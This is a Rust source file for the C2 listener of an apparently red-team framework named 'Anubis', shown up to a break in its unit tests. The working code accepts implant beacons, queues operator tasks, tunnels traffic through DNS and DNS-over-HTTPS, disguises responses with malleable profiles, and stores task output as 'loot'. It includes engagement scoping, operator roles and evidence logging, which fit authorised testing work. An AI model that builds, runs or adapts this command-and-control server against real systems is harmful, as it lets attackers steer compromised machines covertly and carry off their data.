//! Multi-transport C2 listener: HTTP (+ optional rustls mTLS) + DNS/DoH + UDS, aop-2 encrypted.

use super::console;
use super::crypto;
use super::dns_codec::{self, DnsKind};
use super::engagement::{Engagement, Role};
use super::malleable::{self, MalleableProfile};
use super::modules;
use super::protocol::{
    Beacon, BeaconResponse, EncryptedEnvelope, Task, TaskResult, PROTOCOL_V1, PROTOCOL_V2,
};
use super::scope;
use anyhow::{anyhow, Result};
use serde::Serialize;
use serde_json::json;
use sha2::{Digest, Sha256};
use std::collections::{HashMap, VecDeque};
use std::fs;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream, UdpSocket};
use std::os::unix::net::UnixListener;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{SystemTime, UNIX_EPOCH};

#[derive(Default)]
pub struct State {
    pub agents: HashMap<String, serde_json::Value>,
    pub queue: HashMap<String, VecDeque<Task>>,
    pub results: Vec<TaskResult>,
    pub profile: Option<MalleableProfile>,
    /// DNS fragment reassembly: key = peer+kind fingerprint → ordered frags
    pub dns_frags: HashMap<String, Vec<dns_codec::DnsC2Message>>,
}

pub struct ListenOpts {
    pub mtls: bool,
}

#[allow(dead_code)]
pub fn listener_start(eng: &Engagement, engage_dir: &Path, _foreground: bool) -> Result<()> {
    listener_start_with(
        eng,
        engage_dir,
        ListenOpts {
            mtls: eng.mtls_listen,
        },
    )
}

pub fn listener_start_with(eng: &Engagement, engage_dir: &Path, opts: ListenOpts) -> Result<()> {
    eng.validate_live()?;
    super::scope::bind_addr_in_scope(
        &eng.c2_bind,
        eng.allow_non_loopback_bind && eng.network_egress,
        &eng.allowed_hosts,
    )?;

    fs::create_dir_all(engage_dir.join("listeners"))?;
    fs::create_dir_all(engage_dir.join("tasks"))?;
    let profile = malleable::load_from_engage(engage_dir);
    let mut initial_state = State::default();
    initial_state.profile = profile;
    let state = Arc::new(Mutex::new(initial_state));

    let use_mtls = opts.mtls || eng.mtls_listen;
    if use_mtls && !eng.mtls_ready {
        return Err(anyhow!(
            "ANUBIS_MTLS_NOT_READY: certs missing; re-run engage-init"
        ));
    }
    let tls_cfg = if use_mtls {
        Some(crypto::mtls_server_config(engage_dir)?)
    } else {
        None
    };

    let meta = json!({
        "listener": "multi-transport-v3",
        "bind_http": eng.c2_bind,
        "bind_dns": eng.dns_bind,
        "uds": eng.uds_path,
        "transport": eng.transport,
        "protocol": PROTOCOL_V2,
        "encrypt": eng.encrypt_beacons,
        "mtls_ready": eng.mtls_ready,
        "mtls_active": use_mtls,
        "dns_codec": "aop-dns-v1",
        "doh": true,
        "token_auth_enabled": eng.token_auth_enabled,
        "engagement_id": eng.engagement_id,
        "started_unix": now_unix(),
    });
    fs::write(
        engage_dir.join("listeners/listener_meta.json"),
        serde_json::to_string_pretty(&meta)?,
    )?;

    let scheme = if use_mtls { "https" } else { "http" };
    println!(
        "anubis listen: {} {} | DNS {} | UDS {} | protocol={} encrypt={} mtls={}",
        scheme.to_uppercase(),
        eng.c2_bind,
        eng.dns_bind,
        eng.uds_path,
        PROTOCOL_V2,
        eng.encrypt_beacons,
        use_mtls
    );
    println!("  console: {scheme}://{}/", eng.c2_bind);
    println!(
        "  POST /beacon /result /task /doh /dns-query | GET /health /agents /results /rbac /admin/status /"
    );

    let eng = eng.clone();
    let engage_dir = engage_dir.to_path_buf();

    // DNS transport thread (production codec)
    if eng.transport == "dns" || eng.transport == "multi" {
        let st = state.clone();
        let eng_dns = eng.clone();
        let dir = engage_dir.clone();
        thread::spawn(move || {
            if let Err(e) = dns_loop(&eng_dns, &dir, st) {
                eprintln!("dns listener error: {e}");
            }
        });
    }

    // UDS transport thread
    if eng.transport == "uds" || eng.transport == "multi" {
        let st = state.clone();
        let eng_uds = eng.clone();
        let dir = engage_dir.clone();
        thread::spawn(move || {
            if let Err(e) = uds_loop(&eng_uds, &dir, st) {
                eprintln!("uds listener error: {e}");
            }
        });
    }

    // HTTP / mTLS main thread
    let listener = TcpListener::bind(&eng.c2_bind)
        .map_err(|e| anyhow!("ANUBIS_LISTEN_BIND: {}: {}", eng.c2_bind, e))?;
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let state = state.clone();
                let eng = eng.clone();
                let engage_dir = engage_dir.clone();
                let tls_cfg = tls_cfg.clone();
                thread::spawn(move || {
                    if let Err(e) = accept_client(stream, tls_cfg, &eng, &engage_dir, &state) {
                        eprintln!("client error: {e}");
                    }
                });
            }
            Err(e) => eprintln!("accept: {e}"),
        }
    }
    Ok(())
}

fn accept_client(
    stream: TcpStream,
    tls_cfg: Option<Arc<rustls::ServerConfig>>,
    eng: &Engagement,
    engage_dir: &Path,
    state: &Arc<Mutex<State>>,
) -> Result<()> {
    if let Some(cfg) = tls_cfg {
        let conn =
            rustls::ServerConnection::new(cfg).map_err(|e| anyhow!("ANUBIS_MTLS_CONN: {e}"))?;
        let mut tls = rustls::StreamOwned::new(conn, stream);
        // Complete handshake by attempting a read; rustls drives handshake on first IO.
        if let Err(e) = handle_http(&mut tls, eng, engage_dir, state) {
            let _ = write_raw(&mut tls, 500, b"error");
            return Err(e);
        }
        Ok(())
    } else {
        let mut stream = stream;
        if let Err(e) = handle_http(&mut stream, eng, engage_dir, state) {
            let _ = write_raw(&mut stream, 500, b"error");
            return Err(e);
        }
        Ok(())
    }
}

fn handle_http(
    stream: &mut (impl Read + Write),
    eng: &Engagement,
    engage_dir: &Path,
    state: &Arc<Mutex<State>>,
) -> Result<()> {
    let mut buf = [0u8; 1 << 16];
    let n = stream.read(&mut buf)?;
    if n == 0 {
        return Ok(());
    }
    let req = String::from_utf8_lossy(&buf[..n]);
    let (method, path_q) = parse_request_line(&req);
    let (path, query) = split_path_query(&path_q);
    let body = extract_body(&req).to_string();
    let operator = header_value(&req, "X-Anubis-Operator").unwrap_or_else(|| "operator".into());
    let token = header_value(&req, "X-Anubis-Token");

    drain_task_inbox(engage_dir, state)?;

    match (method.as_str(), path.as_str()) {
        ("GET", "/") | ("GET", "/console") => {
            let html = console::console_html(eng);
            write_html(stream, 200, &html)?;
        }
        ("GET", "/health") => write_json(
            stream,
            200,
            &json!({
                "ok": true,
                "engagement_id": eng.engagement_id,
                "protocol": PROTOCOL_V2,
                "encrypt": eng.encrypt_beacons,
                "transport": eng.transport,
                "mtls_ready": eng.mtls_ready,
                "mtls_listen": eng.mtls_listen,
                "dns_codec": "aop-dns-v1",
                "doh": true,
                "token_auth_enabled": eng.token_auth_enabled,
            }),
        )?,
        ("GET", "/agents") => {
            if let Err(e) = eng.assert_auth(&operator, Role::ReadOnly, token.as_deref()) {
                write_json(stream, 403, &json!({"error": e.to_string()}))?;
                return Ok(());
            }
            let st = state.lock().unwrap();
            let agents: Vec<_> = st.agents.values().cloned().collect();
            write_json(stream, 200, &json!({ "agents": agents }))?;
        }
        ("GET", "/results") => {
            if let Err(e) = eng.assert_auth(&operator, Role::ReadOnly, token.as_deref()) {
                write_json(stream, 403, &json!({"error": e.to_string()}))?;
                return Ok(());
            }
            let st = state.lock().unwrap();
            write_json(stream, 200, &json!({ "results": st.results }))?;
        }
        ("POST", "/beacon") => {
            let beacon = decode_beacon(eng, &body)?;
            if beacon.engagement_id != eng.engagement_id {
                write_json(
                    stream,
                    403,
                    &json!({"error":"ANUBIS_C2_ENGAGEMENT_MISMATCH"}),
                )?;
                return Ok(());
            }
            let resp = process_beacon(eng, engage_dir, state, &beacon)?;
            let profile = state.lock().unwrap().profile.clone();
            let out = encode_response(eng, &beacon.agent_id, &resp, profile.as_ref())?;
            let extra = profile.as_ref().map_or(String::new(), |p| p.format_server_headers());
            write_raw_profiled(stream, 200, out.as_bytes(), &extra)?;
        }
        ("POST", "/result") => {
            let result = decode_result(eng, &body)?;
            if result.engagement_id != eng.engagement_id {
                write_json(
                    stream,
                    403,
                    &json!({"error":"ANUBIS_C2_ENGAGEMENT_MISMATCH"}),
                )?;
                return Ok(());
            }
            store_result(engage_dir, state, result)?;
            write_json(stream, 200, &json!({"ok": true}))?;
        }
        ("GET", "/rbac") => {
            if let Err(e) = eng.assert_auth(&operator, Role::ReadOnly, token.as_deref()) {
                write_json(stream, 403, &json!({"error": e.to_string()}))?;
                return Ok(());
            }
            write_json(
                stream,
                200,
                &json!({
                    "operator": operator,
                    "operators": eng.operators.iter().map(|o| json!({
                        "name": o.name,
                        "role": o.role,
                        "token_required": !o.token_hash.is_empty(),
                    })).collect::<Vec<_>>(),
                    "token_auth_enabled": eng.token_auth_enabled,
                    "queue_ok": console::role_can_queue(eng, &operator).is_ok(),
                    "admin_ok": console::role_can_admin(eng, &operator).is_ok(),
                }),
            )?;
        }
        ("GET", "/admin/status") => {
            if let Err(e) = eng.assert_auth(&operator, Role::Admin, token.as_deref()) {
                write_json(stream, 403, &json!({"error": e.to_string()}))?;
                return Ok(());
            }
            let st = state.lock().unwrap();
            write_json(
                stream,
                200,
                &json!({
                    "admin": true,
                    "operator": operator,
                    "agent_count": st.agents.len(),
                    "queued_agents": st.queue.len(),
                    "results": st.results.len(),
                    "engagement_id": eng.engagement_id,
                    "allowed_targets": scope::build_allowed_targets(
                        &eng.allowed_hosts,
                        &eng.allowed_cidrs,
                        &eng.allowed_paths,
                        &eng.allowed_lateral_hosts,
                    ),
                }),
            )?;
        }
        ("POST", "/task") => {
            if let Err(e) = eng.assert_auth(&operator, Role::Operator, token.as_deref()) {
                write_json(stream, 403, &json!({"error": e.to_string()}))?;
                return Ok(());
            }
            let v: serde_json::Value = serde_json::from_str(&body)?;
            let agent_id = v
                .get("agent_id")
                .and_then(|x| x.as_str())
                .unwrap_or("*")
                .to_string();
            let module = v
                .get("module")
                .and_then(|x| x.as_str())
                .ok_or_else(|| anyhow!("module required"))?
                .to_string();
            if !is_valid_agent_module(&module) {
                return Err(anyhow!("unknown agent module: {}", module));
            }
            let args = v
                .get("args")
                .and_then(|a| a.as_array())
                .map(|arr| {
                    arr.iter()
                        .filter_map(|x| x.as_str().map(|s| s.to_string()))
                        .collect()
                })
                .unwrap_or_default();
            let task = Task {
                id: format!(
                    "t-{}",
                    &hex::encode(Sha256::digest(
                        format!("{module}{agent_id}{}", now_unix()).as_bytes()
                    ))[..10]
                ),
                module,
                args,
            };
            let mut st = state.lock().unwrap();
            st.queue
                .entry(agent_id)
                .or_default()
                .push_back(task.clone());
            write_json(stream, 200, &json!({"queued": task, "operator": operator}))?;
        }
        // --- DoH / DNS-over-HTTPS (RFC 8484 + JSON convenience) ---
        ("POST", "/dns-query") | ("POST", "/doh") => {
            handle_doh(stream, eng, engage_dir, state, &req, &body, &query)?;
        }
        ("GET", "/dns-query") | ("GET", "/doh") => {
            handle_doh(stream, eng, engage_dir, state, &req, &body, &query)?;
        }
        _ => write_json(stream, 404, &json!({"error":"not found"}))?,
    }
    Ok(())
}

fn handle_doh(
    stream: &mut (impl Read + Write),
    eng: &Engagement,
    engage_dir: &Path,
    state: &Arc<Mutex<State>>,
    req: &str,
    body: &str,
    query: &str,
) -> Result<()> {
    let ct = header_value(req, "Content-Type").unwrap_or_default();
    // JSON convenience: {"qname":"..."} or wire via ?dns=
    if ct.contains("json") || body.trim_start().starts_with('{') {
        let v: serde_json::Value = serde_json::from_str(body).unwrap_or(json!({}));
        let qname = v
            .get("qname")
            .and_then(|x| x.as_str())
            .unwrap_or("")
            .to_string();
        if qname.is_empty() {
            write_json(stream, 400, &json!({"error":"ANUBIS_DOH_QNAME_REQUIRED"}))?;
            return Ok(());
        }
        let txts = process_dns_qname(eng, engage_dir, state, &qname, "doh-json")?;
        let payload_b32 = txts
            .iter()
            .filter(|t| t.as_str() != "OK")
            .cloned()
            .collect::<Vec<_>>()
            .join("");
        write_json(
            stream,
            200,
            &dns_codec::DohJsonResponse {
                ok: true,
                qname,
                txt: txts,
                payload_b32,
            },
        )?;
        return Ok(());
    }

    // RFC 8484: GET ?dns= or POST application/dns-message
    let wire = if let Some(dns_param) = query_param(query, "dns") {
        dns_codec::doh_decode_param(&dns_param)?
    } else if !body.is_empty() {
        body.as_bytes().to_vec()
    } else {
        write_json(stream, 400, &json!({"error":"ANUBIS_DOH_EMPTY"}))?;
        return Ok(());
    };

    let dq = dns_codec::parse_dns_query(&wire)?;
    let txts = process_dns_qname(eng, engage_dir, state, &dq.qname, "doh-wire")?;
    let resp = dns_codec::build_txt_response(&dq, &txts);
    write_dns_message(stream, 200, &resp)?;
    Ok(())
}

fn process_dns_qname(
    eng: &Engagement,
    engage_dir: &Path,
    state: &Arc<Mutex<State>>,
    qname: &str,
    peer: &str,
) -> Result<Vec<String>> {
    let frag = match dns_codec::decode_qname(qname) {
        Ok(f) => f,
        Err(e) => {
            // Non-C2 queries still get a minimal answer so the codec stays resilient.
            let _ = append_evidence(
                engage_dir,
                "dns_non_c2",
                &json!({"qname": qname, "peer": peer, "error": e.to_string()}),
            );
            return Ok(vec!["NX".into()]);
        }
    };

    let key = format!("{peer}:{:?}:{}", frag.kind, frag.total);
    let payload = {
        let mut st = state.lock().unwrap();
        let bucket = st.dns_frags.entry(key.clone()).or_default();
        // Replace same seq
        if let Some(slot) = bucket.iter_mut().find(|f| f.seq == frag.seq) {
            *slot = frag.clone();
        } else {
            bucket.push(frag.clone());
        }
        let complete = bucket.len() as u16 >= frag.total && frag.total > 0;
        if complete {
            let assembled = dns_codec::reassemble(bucket)?;
            st.dns_frags.remove(&key);
            Some(assembled)
        } else {
            None
        }
    };

    match frag.kind {
        DnsKind::Poll if frag.total == 1 && frag.payload.is_empty() => {
            // Heartbeat / empty poll → return next queued task blob if any
            let agent_id = format!("dns-{}", &hex::encode(Sha256::digest(peer.as_bytes()))[..8]);
            let mut st = state.lock().unwrap();
            st.agents.insert(
                agent_id.clone(),
                json!({
                    "agent_id": agent_id,
                    "transport": "dns",
                    "peer": peer,
                    "last_beacon_unix": now_unix(),
                }),
            );
            let task = st
                .queue
                .get_mut(&agent_id)
                .and_then(|q| q.pop_front())
                .or_else(|| st.queue.get_mut("*").and_then(|q| q.pop_front()));
            drop(st);
            if let Some(t) = task {
                let body = serde_json::to_vec(&t)?;
                return Ok(dns_codec::encode_txt_payload(&body));
            }
            return Ok(vec!["OK".into()]);
        }
        _ => {}
    }

    let Some(raw) = payload else {
        // ACK partial fragment
        return Ok(vec![format!("ACK.{}", frag.seq)]);
    };

    match frag.kind {
        DnsKind::Beacon => {
            let beacon = decode_beacon_bytes(eng, &raw)?;
            if beacon.engagement_id != eng.engagement_id {
                return Ok(vec!["DENY".into()]);
            }
            let resp = process_beacon(eng, engage_dir, state, &beacon)?;
            let profile = state.lock().unwrap().profile.clone();
            let out = encode_response(eng, &beacon.agent_id, &resp, profile.as_ref())?;
            Ok(dns_codec::encode_txt_payload(out.as_bytes()))
        }
        DnsKind::Result => {
            let result = decode_result_bytes(eng, &raw)?;
            if result.engagement_id != eng.engagement_id {
                return Ok(vec!["DENY".into()]);
            }
            store_result(engage_dir, state, result)?;
            Ok(vec!["OK".into()])
        }
        DnsKind::Poll => {
            // Poll with optional agent identity in payload
            let agent_id = if raw.is_empty() {
                format!("dns-{}", &hex::encode(Sha256::digest(peer.as_bytes()))[..8])
            } else {
                String::from_utf8_lossy(&raw).trim().to_string()
            };
            let mut st = state.lock().unwrap();
            st.agents.insert(
                agent_id.clone(),
                json!({
                    "agent_id": agent_id,
                    "transport": "dns",
                    "peer": peer,
                    "last_beacon_unix": now_unix(),
                }),
            );
            let task = st
                .queue
                .get_mut(&agent_id)
                .and_then(|q| q.pop_front())
                .or_else(|| st.queue.get_mut("*").and_then(|q| q.pop_front()));
            drop(st);
            if let Some(t) = task {
                let body = serde_json::to_vec(&t)?;
                Ok(dns_codec::encode_txt_payload(&body))
            } else {
                Ok(vec!["OK".into()])
            }
        }
    }
}

fn dns_loop(eng: &Engagement, engage_dir: &Path, state: Arc<Mutex<State>>) -> Result<()> {
    let sock = UdpSocket::bind(&eng.dns_bind)
        .map_err(|e| anyhow!("ANUBIS_DNS_BIND: {}: {e}", eng.dns_bind))?;
    println!("dns listener on {} (codec aop-dns-v1)", eng.dns_bind);
    let mut buf = [0u8; 1500];
    loop {
        let (n, src) = sock.recv_from(&mut buf)?;
        let peer = src.to_string();
        let reply = match dns_codec::parse_dns_query(&buf[..n]) {
            Ok(dq) => {
                let txts = process_dns_qname(eng, engage_dir, &state, &dq.qname, &peer)
                    .unwrap_or_else(|e| {
                        vec![format!("ERR")]
                            .into_iter()
                            .chain(std::iter::once(e.to_string()))
                            .take(1)
                            .collect()
                    });
                let _ = append_evidence(
                    engage_dir,
                    "dns_query",
                    &json!({"peer": peer, "qname": dq.qname, "bytes": n}),
                );
                dns_codec::build_txt_response(&dq, &txts)
            }
            Err(_) => {
                // Echo only when not parseable (legacy lab probe)
                buf[..n].to_vec()
            }
        };
        let _ = sock.send_to(&reply, src);
    }
}

fn uds_loop(eng: &Engagement, engage_dir: &Path, state: Arc<Mutex<State>>) -> Result<()> {
    let path = PathBuf::from(&eng.uds_path);
    let _ = fs::remove_file(&path);
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    let listener = UnixListener::bind(&path)
        .map_err(|e| anyhow!("ANUBIS_UDS_BIND: {}: {e}", path.display()))?;
    println!("uds listener on {}", path.display());
    for stream in listener.incoming() {
        let mut stream = stream?;
        let mut buf = String::new();
        stream.read_to_string(&mut buf)?;
        if buf.trim().is_empty() {
            continue;
        }
        if let Ok(beacon) = decode_beacon(eng, buf.trim()) {
            let resp = process_beacon(eng, engage_dir, &state, &beacon)?;
            let profile = state.lock().unwrap().profile.clone();
            let out = encode_response(eng, &beacon.agent_id, &resp, profile.as_ref())?;
            let _ = stream.write_all(out.as_bytes());
        } else if let Ok(result) = decode_result(eng, buf.trim()) {
            store_result(engage_dir, &state, result)?;
            let _ = stream.write_all(br#"{"ok":true}"#);
        }
    }
    Ok(())
}

fn process_beacon(
    eng: &Engagement,
    engage_dir: &Path,
    state: &Arc<Mutex<State>>,
    beacon: &Beacon,
) -> Result<BeaconResponse> {
    let mut st = state.lock().unwrap();
    st.agents.insert(
        beacon.agent_id.clone(),
        json!({
            "agent_id": beacon.agent_id,
            "hostname": beacon.hostname,
            "os": beacon.os,
            "arch": beacon.arch,
            "pid": beacon.pid,
            "key_id": beacon.key_id,
            "last_beacon_unix": now_unix(),
        }),
    );
    let mut tasks = Vec::new();
    if let Some(q) = st.queue.get_mut(&beacon.agent_id) {
        while let Some(t) = q.pop_front() {
            tasks.push(t);
        }
    }
    if let Some(q) = st.queue.get_mut("*") {
        while let Some(t) = q.pop_front() {
            tasks.push(t);
        }
    }
    drop(st);
    let _ = append_evidence(
        engage_dir,
        "beacon",
        &json!({"agent_id": beacon.agent_id, "hostname": beacon.hostname, "protocol": beacon.protocol}),
    );
    Ok(BeaconResponse {
        protocol: if eng.encrypt_beacons {
            PROTOCOL_V2.into()
        } else {
            PROTOCOL_V1.into()
        },
        tasks,
        sleep_ms: eng.sleep_ms.max(beacon.sleep_ms).max(500),
        jitter_pct: eng.jitter_pct,
        die: false,
    })
}

fn store_result(engage_dir: &Path, state: &Arc<Mutex<State>>, result: TaskResult) -> Result<()> {
    {
        let mut st = state.lock().unwrap();
        st.results.push(result.clone());
    }
    let loot = engage_dir.join("loot");
    fs::create_dir_all(&loot)?;
    let fname = format!(
        "result-{}-{}.json",
        result.task_id,
        &hex::encode(Sha256::digest(result.output.as_bytes()))[..8]
    );
    fs::write(loot.join(fname), serde_json::to_string_pretty(&result)?)?;
    append_evidence(engage_dir, "task_result", &serde_json::to_value(&result)?)?;
    Ok(())
}

fn decode_beacon(eng: &Engagement, body: &str) -> Result<Beacon> {
    decode_beacon_bytes(eng, body.trim().as_bytes())
}

/// Decode a beacon. When `encrypt_beacons` is true, accept only a valid encrypted
/// envelope with authenticated AEAD open — never fall back to plaintext.
fn decode_beacon_bytes(eng: &Engagement, raw: &[u8]) -> Result<Beacon> {
    if eng.encrypt_beacons {
        return open_encrypted_json(eng, raw);
    }
    let body = std::str::from_utf8(raw).unwrap_or("");
    Ok(serde_json::from_slice(raw).or_else(|_| serde_json::from_str(body))?)
}

fn decode_result(eng: &Engagement, body: &str) -> Result<TaskResult> {
    decode_result_bytes(eng, body.trim().as_bytes())
}

/// Decode a task result. Encryption-required mode is fail-closed (no plaintext fallback).
fn decode_result_bytes(eng: &Engagement, raw: &[u8]) -> Result<TaskResult> {
    if eng.encrypt_beacons {
        return open_encrypted_json(eng, raw);
    }
    let body = std::str::from_utf8(raw).unwrap_or("");
    Ok(serde_json::from_slice(raw).or_else(|_| serde_json::from_str(body))?)
}

fn open_encrypted_json<T: serde::de::DeserializeOwned>(eng: &Engagement, raw: &[u8]) -> Result<T> {
    let body = std::str::from_utf8(raw)
        .map_err(|_| anyhow::anyhow!("ANUBIS_CRYPTO_ENVELOPE_REQUIRED: body is not valid UTF-8"))?;
    let env: EncryptedEnvelope = serde_json::from_slice(raw)
        .or_else(|_| serde_json::from_str(body))
        .map_err(|e| {
            anyhow::anyhow!(
                "ANUBIS_CRYPTO_ENVELOPE_REQUIRED: encrypt_beacons=true rejects plaintext/malformed envelopes ({e})"
            )
        })?;
    if env.blob.trim().is_empty() {
        return Err(anyhow::anyhow!(
            "ANUBIS_CRYPTO_ENVELOPE_REQUIRED: empty blob"
        ));
    }
    crypto::open_json(&eng.psk_hex, &env.blob).map_err(|e| {
        anyhow::anyhow!("ANUBIS_CRYPTO_AUTH_FAILED: AEAD open rejected envelope ({e})")
    })
}

fn encode_response(
    eng: &Engagement,
    agent_id: &str,
    resp: &BeaconResponse,
    profile: Option<&MalleableProfile>,
) -> Result<String> {
    let raw = if eng.encrypt_beacons {
        let blob = crypto::seal_json(&eng.psk_hex, resp)?;
        let env = EncryptedEnvelope {
            protocol: PROTOCOL_V2.into(),
            engagement_id: eng.engagement_id.clone(),
            agent_id: agent_id.into(),
            blob,
        };
        serde_json::to_string(&env)?
    } else {
        serde_json::to_string(resp)?
    };

    if let Some(p) = profile {
        let transformed = p.apply_transform(raw.as_bytes());
        Ok(String::from_utf8_lossy(&transformed).into_owned())
    } else {
        Ok(raw)
    }
}

fn drain_task_inbox(engage_dir: &Path, state: &Arc<Mutex<State>>) -> Result<()> {
    let inbox = engage_dir.join("tasks/inbox.jsonl");
    if !inbox.exists() {
        return Ok(());
    }
    let data = fs::read_to_string(&inbox)?;
    if data.trim().is_empty() {
        return Ok(());
    }
    let mut st = state.lock().unwrap();
    for line in data.lines() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        if let Ok(v) = serde_json::from_str::<serde_json::Value>(line) {
            let agent_id = v
                .get("agent_id")
                .and_then(|x| x.as_str())
                .unwrap_or("*")
                .to_string();
            let module = v
                .get("module")
                .and_then(|x| x.as_str())
                .unwrap_or("whoami")
                .to_string();
            let args = v
                .get("args")
                .and_then(|a| a.as_array())
                .map(|arr| {
                    arr.iter()
                        .filter_map(|x| x.as_str().map(|s| s.to_string()))
                        .collect()
                })
                .unwrap_or_default();
            let task = Task {
                id: format!(
                    "t-{}",
                    &hex::encode(Sha256::digest(format!("{line}{}", now_unix()).as_bytes()))[..10]
                ),
                module,
                args,
            };
            st.queue.entry(agent_id).or_default().push_back(task);
        }
    }
    let _ = fs::write(&inbox, "");
    Ok(())
}

fn parse_request_line(req: &str) -> (String, String) {
    let line = req.lines().next().unwrap_or("");
    let mut parts = line.split_whitespace();
    (
        parts.next().unwrap_or("GET").into(),
        parts.next().unwrap_or("/").into(),
    )
}

fn split_path_query(path_q: &str) -> (String, String) {
    if let Some((p, q)) = path_q.split_once('?') {
        (p.to_string(), q.to_string())
    } else {
        (path_q.to_string(), String::new())
    }
}

fn query_param(query: &str, key: &str) -> Option<String> {
    for pair in query.split('&') {
        if let Some((k, v)) = pair.split_once('=') {
            if k == key {
                return Some(v.to_string());
            }
        }
    }
    None
}

fn extract_body(req: &str) -> &str {
    if let Some(idx) = req.find("\r\n\r\n") {
        &req[idx + 4..]
    } else if let Some(idx) = req.find("\n\n") {
        &req[idx + 2..]
    } else {
        ""
    }
}

fn header_value(req: &str, name: &str) -> Option<String> {
    for line in req.lines() {
        if line
            .to_ascii_lowercase()
            .starts_with(&name.to_ascii_lowercase())
        {
            if let Some((_, v)) = line.split_once(':') {
                return Some(v.trim().to_string());
            }
        }
    }
    None
}

fn write_json(stream: &mut impl Write, status: u16, body: &impl Serialize) -> Result<()> {
    let payload = serde_json::to_vec(body)?;
    write_raw(stream, status, &payload)
}

fn write_html(stream: &mut impl Write, status: u16, html: &str) -> Result<()> {
    let reason = if status == 200 { "OK" } else { "Error" };
    write!(
        stream,
        "HTTP/1.1 {status} {reason}\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
        html.len()
    )?;
    stream.write_all(html.as_bytes())?;
    Ok(())
}

fn write_raw(stream: &mut impl Write, status: u16, payload: &[u8]) -> Result<()> {
    write_raw_profiled(stream, status, payload, "")
}

fn write_raw_profiled(
    stream: &mut impl Write,
    status: u16,
    payload: &[u8],
    extra_headers: &str,
) -> Result<()> {
    let reason = match status {
        200 => "OK",
        403 => "Forbidden",
        404 => "Not Found",
        400 => "Bad Request",
        _ => "Error",
    };
    write!(
        stream,
        "HTTP/1.1 {status} {reason}\r\nContent-Type: application/json\r\nContent-Length: {}\r\n{extra_headers}Connection: close\r\n\r\n",
        payload.len()
    )?;
    stream.write_all(payload)?;
    Ok(())
}

fn write_dns_message(stream: &mut impl Write, status: u16, payload: &[u8]) -> Result<()> {
    write!(
        stream,
        "HTTP/1.1 {status} OK\r\nContent-Type: application/dns-message\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
        payload.len()
    )?;
    stream.write_all(payload)?;
    Ok(())
}

fn append_evidence(engage_dir: &Path, kind: &str, value: &serde_json::Value) -> Result<()> {
    let dir = engage_dir.join("evidence");
    fs::create_dir_all(&dir)?;
    let line = json!({"ts_unix": now_unix(), "kind": kind, "data": value});
    let mut f = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(dir.join("actions.jsonl"))?;
    writeln!(f, "{}", serde_json::to_string(&line)?)?;
    Ok(())
}

fn now_unix() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

pub fn queue_task_file(
    engage_dir: &Path,
    agent_id: &str,
    module: &str,
    args: &[String],
) -> Result<PathBuf> {
    let inbox = engage_dir.join("tasks/inbox.jsonl");
    fs::create_dir_all(engage_dir.join("tasks"))?;
    let line = json!({"agent_id": agent_id, "module": module, "args": args});
    let mut f = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&inbox)?;
    writeln!(f, "{}", serde_json::to_string(&line)?)?;
    Ok(inbox)
}

fn is_valid_agent_module(name: &str) -> bool {
    modules::catalog()
        .iter()
        .any(|m| m.name == name && m.side == "agent")
}

#[cfg(test)]
mod module_validation_tests {
    use super::*;

    #[test]
    fn all_catalog_agent_modules_accepted() {
        for m in modules::catalog() {
            if m.side != "agent" {
                continue;
            }
            assert!(
                is_valid_agent_module(m.name),
                "over-rejection: catalog agent module `{}` rejected by listener validation",
                m.name,
            );
        }
    }

    #[test]
    fn unknown_module_rejected() {
        assert!(
            !is_valid_agent_module("nonexistent_exploit_module"),
            "unknown module name must be rejected",
        );
    }

    #[test]
    fn operator_only_module_rejected() {
        let operator_modules: Vec<&str> = modules::catalog()
            .iter()
            .filter(|m| m.side == "operator")
            .map(|m| m.name)
            .collect();
        for name in &operator_modules {
            assert!(
                !is_valid_agent_module(name),
                "operator-only module `{}` must not be accepted as agent task",
                name,
            );
        }
    }
}

#[cfg(test)]
mod encrypt_decode_tests {
    use super::*;
    use crate::offensive::engagement::Engagement;
    use crate::offensive::protocol::Beacon;

    fn eng_encrypt(on: bool) -> Engagement {
        let mut e = Engagement::default_lab("decode-test", "auth-ok");
        e.encrypt_beacons = on;
        e.rehash();
        e
    }

    #[test]
    fn encrypt_required_rejects_plaintext_beacon() {
        let eng = eng_encrypt(true);
        let plain = br#"{"protocol":"aop-2","agent_id":"a","engagement_id":"e","hostname":"h","os":"mac","arch":"arm64","pid":1,"sleep_ms":1,"jitter_pct":0,"key_id":"k"}"#;
        let err = decode_beacon_bytes(&eng, plain).unwrap_err().to_string();
        assert!(
            err.contains("ANUBIS_CRYPTO_ENVELOPE_REQUIRED") || err.contains("ANUBIS_CRYPTO"),
            "got {err}"
        );
    }

    #[test]
    fn encrypt_required_rejects_empty_blob() {
        let eng = eng_encrypt(true);
        let bad = format!(
            r#"{{"protocol":"aop-2","engagement_id":"{}","agent_id":"a","blob":""}}"#,
            eng.engagement_id
        );
        let err = decode_beacon_bytes(&eng, bad.as_bytes())
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("ENVELOPE") || err.contains("empty"),
            "got {err}"
        );
    }

    #[test]
    fn encrypt_required_rejects_bad_tag() {
        let eng = eng_encrypt(true);
        let bad = format!(
            r#"{{"protocol":"aop-2","engagement_id":"{}","agent_id":"a","blob":"AAAAAAAAAAAAAAAAAAAAAA=="}}"#,
            eng.engagement_id
        );
        let err = decode_beacon_bytes(&eng, bad.as_bytes())
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("ANUBIS_CRYPTO_AUTH_FAILED") || err.contains("CRYPTO"),
            "got {err}"
        );
    }

    #[test]
    fn encrypt_required_accepts_valid_envelope() {
        let eng = eng_encrypt(true);
        let beacon = Beacon {
            protocol: "aop-2".into(),
            agent_id: "agt-1".into(),
            engagement_id: eng.engagement_id.clone(),
            hostname: "lab".into(),
            os: "macos".into(),
            arch: "aarch64".into(),
            pid: 42,
            sleep_ms: 1000,
            jitter_pct: 10,
            key_id: "kid".into(),
        };
